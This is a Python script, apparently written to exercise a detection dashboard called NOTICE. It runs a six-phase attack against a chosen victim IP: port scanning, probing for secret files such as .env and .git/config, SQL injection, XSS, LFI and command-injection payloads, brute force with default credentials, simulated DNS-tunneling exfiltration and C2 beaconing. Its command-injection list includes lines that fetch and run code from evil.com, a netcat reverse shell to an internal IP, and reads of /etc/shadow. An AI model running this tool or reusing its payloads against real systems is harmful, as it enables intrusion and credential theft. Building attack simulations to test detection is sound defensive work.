#!/usr/bin/env python3
"""
NOTICE Attack Simulation Script — Educational/Demo Purpose Only
================================================================
Simulates a realistic multi-phase attack for live demonstration.
All traffic stays within the internal network (10.x.x.x).

Attack Phases:
  Phase 1 - Reconnaissance (port scanning, service discovery)
  Phase 2 - Web Application Probing (directory enumeration, vuln scanning)
  Phase 3 - Exploitation Attempts (SQLi, XSS, command injection, LFI)
  Phase 4 - Credential Harvesting (brute force, default creds)
  Phase 5 - Data Exfiltration Simulation (large transfers, DNS tunneling patterns)
  Phase 6 - C2 Beaconing (periodic callbacks simulating malware)

Usage:
  python3 attack_sim.py --victim <IP>              # Run all phases
  python3 attack_sim.py --victim <IP> --phase 1    # Run specific phase
  python3 attack_sim.py --victim <IP> --slow       # Slower pace for live demo
  python3 attack_sim.py --victim <IP> --fast       # Quick run for testing

Environment variables (optional overrides):
  ATTACKER_IP  — source IP to embed in some payloads (default: 127.0.0.1)
  VICTIM_IP    — target IP if not passed via --victim

IMPORTANT: Run this ONLY on authorized test networks.
"""

import os
import socket
import time
import sys
import random
import string
import struct
import argparse
import threading

ATTACKER = os.environ.get("ATTACKER_IP", "127.0.0.1")
VICTIM = os.environ.get("VICTIM_IP", "127.0.0.1")

# Common ports to scan
RECON_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
    993, 995, 1433, 1521, 3306, 3389, 5000, 5432, 5900, 6379,
    8000, 8080, 8443, 8888, 9090, 9200, 27017,
]

# Web paths for directory enumeration
WEB_PATHS = [
    "/", "/index.html", "/login", "/admin", "/administrator",
    "/wp-admin", "/wp-login.php", "/phpmyadmin", "/phpMyAdmin",
    "/.env", "/.git/config", "/.htaccess", "/.htpasswd",
    "/robots.txt", "/sitemap.xml", "/api", "/api/v1",
    "/backup", "/backup.sql", "/backup.zip", "/db.sql",
    "/config.php", "/config.yml", "/config.json",
    "/server-status", "/server-info", "/.svn/entries",
    "/console", "/debug", "/trace", "/actuator",
    "/actuator/health", "/actuator/env",
    "/wp-content/uploads/", "/uploads/", "/tmp/",
    "/cgi-bin/", "/cgi-bin/test.cgi",
    "/shell.php", "/cmd.php", "/webshell.php", "/c99.php",
    "/test.php", "/info.php", "/phpinfo.php",
    "/.DS_Store", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/package.json", "/composer.json", "/Gemfile",
]

# SQLi payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT username,password FROM users --",
    "1; DROP TABLE users --",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",
    "admin'--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "' OR 1=1#",
    "-1 UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables#",
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(document.cookie)",
    "<body onload=alert('XSS')>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
]

# Command injection payloads
CMDI_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "; whoami",
    "| id",
    "; uname -a",
    "$(cat /etc/shadow)",
    "`wget http://evil.com/shell.sh`",
    "; curl http://evil.com/mal.py | python3",
    "| nc -e /bin/sh 10.2.130.100 4444",
    "; python3 -c 'import os;os.system(\"id\")'",
]

# LFI payloads
LFI_PAYLOADS = [
    "../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
]

# User agents to rotate (some scanners, some legit-looking)
USER_AGENTS = [
    "",  # Empty UA — scanner indicator
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Python-urllib/3.12",
    "python-requests/2.31.0",
    "curl/8.5.0",
    "Wget/1.21",
    "Go-http-client/1.1",
    "Nikto/2.1.6",
    "sqlmap/1.7",
    "DirBuster-1.0-RC1",
    "gobuster/3.6",
]

CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("administrator", "administrator"), ("admin", "admin123"),
    ("user", "user"), ("test", "test"), ("guest", "guest"),
    ("admin", "Password1"), ("admin", "letmein"),
    ("sa", "sa"), ("postgres", "postgres"),
    ("admin", "admin@123"), ("admin", "qwerty"),
]


def log(msg, phase=None):
    prefix = f"[Phase {phase}]" if phase else "[*]"
    ts = time.strftime("%H:%M:%S")
    print(f"  {ts} {prefix} {msg}")


def tcp_connect(ip, port, timeout=2, data=None):
    """Attempt a TCP connection, optionally send data."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        if result == 0 and data:
            s.sendall(data)
            try:
                resp = s.recv(4096)
                return True, resp
            except socket.timeout:
                return True, b""
        s.close()
        return result == 0, b""
    except (socket.error, OSError):
        return False, b""


def http_request(ip, port, method, path, headers=None, body=None, timeout=3):
    """Send a raw HTTP request."""
    if headers is None:
        headers = {}
    if "User-Agent" not in headers:
        headers["User-Agent"] = random.choice(USER_AGENTS)
    if "Host" not in headers:
        headers["Host"] = ip

    req = f"{method} {path} HTTP/1.1\r\n"
    for k, v in headers.items():
        req += f"{k}: {v}\r\n"
    if body:
        req += f"Content-Length: {len(body)}\r\n"
        req += "Content-Type: application/x-www-form-urlencoded\r\n"
    req += "Connection: close\r\n\r\n"
    if body:
        req += body

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(req.encode())
        resp = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return resp.decode("utf-8", errors="replace")
    except (socket.error, OSError):
        return ""


def phase1_recon(delay=0.1):
    """Phase 1: Reconnaissance — Port scanning and service fingerprinting."""
    print("\n" + "=" * 60)
    print("  PHASE 1: RECONNAISSANCE")
    print("  Port Scanning & Service Discovery")
    print(f"  Target: {VICTIM}")
    print("=" * 60)

    # SYN-style port scan (TCP connect)
    log(f"Starting port scan against {VICTIM} ({len(RECON_PORTS)} ports)", 1)
    open_ports = []

    for port in RECON_PORTS:
        is_open, banner = tcp_connect(VICTIM, port, timeout=1)
        status = "OPEN" if is_open else "closed"
        if is_open:
            open_ports.append(port)
            log(f"  Port {port:5d}/tcp  {status}  {banner[:50].decode('utf-8', errors='replace') if banner else ''}", 1)
        time.sleep(delay)

    # Additional random ports to make it look like a full scan
    log("Scanning additional ports...", 1)
    random_ports = random.sample(range(1, 65535), 50)
    for port in random_ports:
        if port not in RECON_PORTS:
            tcp_connect(VICTIM, port, timeout=0.5)
            time.sleep(delay * 0.5)

    log(f"Scan complete: {len(open_ports)} open ports found: {open_ports}", 1)

    # ICMP ping (if possible)
    try:
        log(f"Sending ICMP echo to {VICTIM}", 1)
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.settimeout(2)
        # ICMP echo request
        icmp_header = struct.pack("bbHHh", 8, 0, 0, 1, 1)
        checksum = 0
        for i in range(0, len(icmp_header), 2):
            w = icmp_header[i] + (icmp_header[i + 1] << 8)
            checksum += w
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        icmp_header = struct.pack("bbHHh", 8, 0, checksum, 1, 1)
        s.sendto(icmp_header, (VICTIM, 0))
        s.close()
    except (PermissionError, OSError):
        log("ICMP requires root — skipping ping", 1)

    return open_ports


def phase2_web_probe(port=80, delay=0.2):
    """Phase 2: Web Application Probing — Directory enumeration."""
    print("\n" + "=" * 60)
    print("  PHASE 2: WEB APPLICATION PROBING")
    print("  Directory Enumeration & Fingerprinting")
    print(f"  Target: {VICTIM}:{port}")
    print("=" * 60)

    log(f"Starting directory enumeration on {VICTIM}:{port}", 2)
    found = []

    for path in WEB_PATHS:
        ua = random.choice(USER_AGENTS)
        resp = http_request(VICTIM, port, "GET", path, headers={"User-Agent": ua})
        status = "?"
        if "200 OK" in resp[:100]:
            status = "200"
            found.append(path)
        elif "301" in resp[:100] or "302" in resp[:100]:
            status = "3xx"
            found.append(path)
        elif "403" in resp[:100]:
            status = "403"
        elif "404" in resp[:100]:
            status = "404"

        if status in ("200", "3xx", "403"):
            log(f"  [{status}] {path}", 2)
        time.sleep(delay)

    # Nmap-style HTTP probe
    log("Sending Nmap HTTP version probe...", 2)
    http_request(VICTIM, port, "GET", "/nice%20ports%2C/Tri%6Eity.txt%2ebak",
                 headers={"User-Agent": ""})
    time.sleep(0.5)

    # OPTIONS probe
    http_request(VICTIM, port, "OPTIONS", "/",
                 headers={"User-Agent": ""})

    log(f"Enumeration complete: {len(found)} interesting paths found", 2)
    return found


def phase3_exploit(port=80, delay=0.3):
    """Phase 3: Exploitation Attempts — SQLi, XSS, command injection, LFI."""
    print("\n" + "=" * 60)
    print("  PHASE 3: EXPLOITATION ATTEMPTS")
    print("  SQL Injection, XSS, Command Injection, LFI")
    print(f"  Target: {VICTIM}:{port}")
    print("=" * 60)

    # SQL Injection attempts
    log("Attempting SQL Injection...", 3)
    for payload in SQLI_PAYLOADS:
        # GET-based SQLi
        encoded = payload.replace(" ", "%20").replace("'", "%27").replace("#", "%23")
        http_request(VICTIM, port, "GET", f"/search?q={encoded}",
                     headers={"User-Agent": random.choice(USER_AGENTS[:3])})
        time.sleep(delay)
        # POST-based SQLi
        http_request(VICTIM, port, "POST", "/login",
                     headers={"User-Agent": random.choice(USER_AGENTS[:3])},
                     body=f"username={encoded}&password=test")
        time.sleep(delay)
    log(f"  Sent {len(SQLI_PAYLOADS) * 2} SQLi payloads", 3)

    # XSS attempts
    log("Attempting Cross-Site Scripting (XSS)...", 3)
    for payload in XSS_PAYLOADS:
        encoded = payload.replace("<", "%3C").replace(">", "%3E").replace('"', "%22")
        http_request(VICTIM, port, "GET", f"/search?q={encoded}",
                     headers={"User-Agent": random.choice(USER_AGENTS[:3])})
        time.sleep(delay)
    log(f"  Sent {len(XSS_PAYLOADS)} XSS payloads", 3)

    # Command injection
    log("Attempting Command Injection...", 3)
    for payload in CMDI_PAYLOADS:
        encoded = payload.replace(" ", "%20").replace("|", "%7C").replace(";", "%3B")
        http_request(VICTIM, port, "GET", f"/ping?host={encoded}",
                     headers={"User-Agent": random.choice(USER_AGENTS[:3])})
        time.sleep(delay)
        # Also try in POST body
        http_request(VICTIM, port, "POST", "/api/exec",
                     headers={"User-Agent": random.choice(USER_AGENTS[:3])},
                     body=f"cmd={encoded}")
        time.sleep(delay)
    log(f"  Sent {len(CMDI_PAYLOADS) * 2} command injection payloads", 3)

    # LFI / Path traversal
    log("Attempting Local File Inclusion (LFI)...", 3)
    for payload in LFI_PAYLOADS:
        encoded = payload.replace("../", "..%2f")
        http_request(VICTIM, port, "GET", f"/page?file={encoded}",
                     headers={"User-Agent": random.choice(USER_AGENTS[:3])})
        time.sleep(delay)
    log(f"  Sent {len(LFI_PAYLOADS)} LFI payloads", 3)

    log("Exploitation phase complete", 3)


def phase4_brute_force(port=80, delay=0.3):
    """Phase 4: Credential Harvesting — Brute force login attempts."""
    print("\n" + "=" * 60)
    print("  PHASE 4: CREDENTIAL HARVESTING")
    print("  Brute Force Login Attempts")
    print(f"  Target: {VICTIM}:{port}")
    print("=" * 60)

    log("Starting brute force against web login...", 4)
    for user, passwd in CREDENTIALS:
        resp = http_request(VICTIM, port, "POST", "/login",
                           headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                           body=f"username={user}&password={passwd}")
        status = "200" if "200" in resp[:50] else "401" if "401" in resp[:50] else "?"
        log(f"  Login attempt: {user}:{passwd} -> {status}", 4)
        time.sleep(delay)

    # SSH brute force attempts (if port 22 is reachable)
    log("Attempting SSH connections...", 4)
    for user, passwd in CREDENTIALS[:5]:
        tcp_connect(VICTIM, 22, timeout=2, data=f"SSH-2.0-OpenSSH_8.9\r\n".encode())
        time.sleep(delay)

    # SMB connection attempts
    log("Attempting SMB connections...", 4)
    for port in [445, 139]:
        tcp_connect(VICTIM, port, timeout=2)
        time.sleep(delay)

    log(f"Brute force complete: {len(CREDENTIALS)} credential pairs tested", 4)


def phase5_exfiltration(port=80, delay=0.5):
    """Phase 5: Data Exfiltration Simulation."""
    print("\n" + "=" * 60)
    print("  PHASE 5: DATA EXFILTRATION SIMULATION")
    print("  Large Transfers & DNS Tunneling Patterns")
    print(f"  Target: {VICTIM}")
    print("=" * 60)

    # Simulate large data download (file exfil)
    log("Simulating large data transfer (fake exfiltration)...", 5)
    for i in range(10):
        # Send large POST bodies (fake stolen data upload)
        fake_data = "".join(random.choices(string.ascii_letters + string.digits, k=8192))
        http_request(VICTIM, port, "POST", "/api/upload",
                     headers={
                         "User-Agent": "Mozilla/5.0",
                         "X-Forwarded-For": ATTACKER,
                     },
                     body=f"data={fake_data}")
        log(f"  Exfil chunk {i + 1}/10 ({len(fake_data)} bytes)", 5)
        time.sleep(delay)

    # DNS tunneling simulation — long subdomain queries
    log("Simulating DNS tunneling patterns...", 5)
    for i in range(15):
        # Generate long random subdomain (mimics encoded data in DNS)
        encoded_data = "".join(random.choices(string.ascii_lowercase + string.digits, k=50))
        domain = f"{encoded_data}.data.exfil.attacker.example.com"
        try:
            socket.getaddrinfo(domain, None, socket.AF_INET, socket.SOCK_STREAM)
        except (socket.gaierror, OSError):
            pass  # Expected — domain doesn't exist
        log(f"  DNS tunnel query: {domain[:40]}...", 5)
        time.sleep(delay * 0.5)

    log("Exfiltration simulation complete", 5)


def phase6_c2_beacon(port=80, duration=60, interval=5):
    """Phase 6: C2 Beaconing — Periodic callbacks simulating malware."""
    print("\n" + "=" * 60)
    print("  PHASE 6: C2 BEACONING SIMULATION")
    print(f"  Periodic callbacks every {interval}s for {duration}s")
    print(f"  Target: {VICTIM}:{port}")
    print("=" * 60)

    log(f"Starting beacon (interval={interval}s, duration={duration}s)...", 6)
    start = time.time()
    count = 0

    while time.time() - start < duration:
        count += 1
        # Beacon check-in (small GET with session token)
        token = "".join(random.choices(string.hexdigits, k=32))
        http_request(VICTIM, port, "GET", f"/api/status?session={token}",
                     headers={
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                         "Cookie": f"PHPSESSID={token}",
                     })

        # Occasional command fetch (POST)
        if count % 3 == 0:
            http_request(VICTIM, port, "POST", "/api/command",
                         headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                         body=f"id={token}&cmd=heartbeat")

        elapsed = int(time.time() - start)
        log(f"  Beacon #{count} | elapsed: {elapsed}s / {duration}s", 6)

        # Add small jitter to interval
        jitter = random.uniform(-0.5, 0.5)
        time.sleep(max(1, interval + jitter))

    log(f"C2 beaconing complete: {count} callbacks sent", 6)


def run_full_attack(speed="normal"):
    """Run all attack phases sequentially."""
    delays = {
        "fast": {"scan": 0.02, "web": 0.05, "exploit": 0.1, "brute": 0.1, "exfil": 0.2, "c2_dur": 30, "c2_int": 3},
        "normal": {"scan": 0.1, "web": 0.2, "exploit": 0.3, "brute": 0.3, "exfil": 0.5, "c2_dur": 60, "c2_int": 5},
        "slow": {"scan": 0.5, "web": 1.0, "exploit": 1.5, "brute": 1.0, "exfil": 2.0, "c2_dur": 120, "c2_int": 10},
    }
    d = delays.get(speed, delays["normal"])

    print("\n" + "#" * 60)
    print("#  NOTICE Attack Simulation — Educational Demo")
    print(f"#  Attacker: {ATTACKER}")
    print(f"#  Victim:   {VICTIM}")
    print(f"#  Speed:    {speed}")
    print(f"#  Time:     {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("#" + "=" * 59)
    print("#  WARNING: Run only on authorized networks!")
    print("#" * 60)

    try:
        # Phase 1: Recon
        open_ports = phase1_recon(delay=d["scan"])
        time.sleep(2)

        # Phase 2: Web probing (use port 8080 or first open web port)
        web_port = 8080
        for p in [8080, 80, 443, 8443, 5000, 8000]:
            if p in open_ports:
                web_port = p
                break
        phase2_web_probe(port=web_port, delay=d["web"])
        time.sleep(2)

        # Phase 3: Exploitation
        phase3_exploit(port=web_port, delay=d["exploit"])
        time.sleep(2)

        # Phase 4: Brute force
        phase4_brute_force(port=web_port, delay=d["brute"])
        time.sleep(2)

        # Phase 5: Exfiltration
        phase5_exfiltration(port=web_port, delay=d["exfil"])
        time.sleep(2)

        # Phase 6: C2 Beaconing
        phase6_c2_beacon(port=web_port, duration=d["c2_dur"], interval=d["c2_int"])

    except KeyboardInterrupt:
        print("\n\n[!] Attack simulation interrupted by user")
        return

    print("\n" + "#" * 60)
    print("#  SIMULATION COMPLETE")
    print(f"#  All 6 phases executed against {VICTIM}")
    print("#  Check NOTICE dashboard for real-time detection")
    print("#" * 60)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NOTICE Attack Simulation Script")
    parser.add_argument("--phase", type=int, choices=[1, 2, 3, 4, 5, 6],
                        help="Run specific phase only (1-6)")
    parser.add_argument("--fast", action="store_true", help="Fast mode for quick testing")
    parser.add_argument("--slow", action="store_true", help="Slow mode for live demos")
    parser.add_argument("--port", type=int, default=8080, help="Target web port (default: 8080)")
    parser.add_argument("--victim", type=str, default=VICTIM, help=f"Victim IP (default: {VICTIM})")
    parser.add_argument("--attacker", type=str, default=ATTACKER, help=f"Attacker IP (default: {ATTACKER})")
    args = parser.parse_args()

    VICTIM = args.victim
    ATTACKER = args.attacker

    speed = "fast" if args.fast else "slow" if args.slow else "normal"

    if args.phase:
        print(f"\n[*] Running Phase {args.phase} only (speed: {speed})")
        delays = {"fast": 0.05, "normal": 0.2, "slow": 1.0}
        d = delays[speed]
        if args.phase == 1:
            phase1_recon(delay=d)
        elif args.phase == 2:
            phase2_web_probe(port=args.port, delay=d)
        elif args.phase == 3:
            phase3_exploit(port=args.port, delay=d)
        elif args.phase == 4:
            phase4_brute_force(port=args.port, delay=d)
        elif args.phase == 5:
            phase5_exfiltration(port=args.port, delay=d)
        elif args.phase == 6:
            phase6_c2_beacon(port=args.port, duration=60 if speed != "fast" else 20, interval=5)
    else:
        run_full_attack(speed=speed)
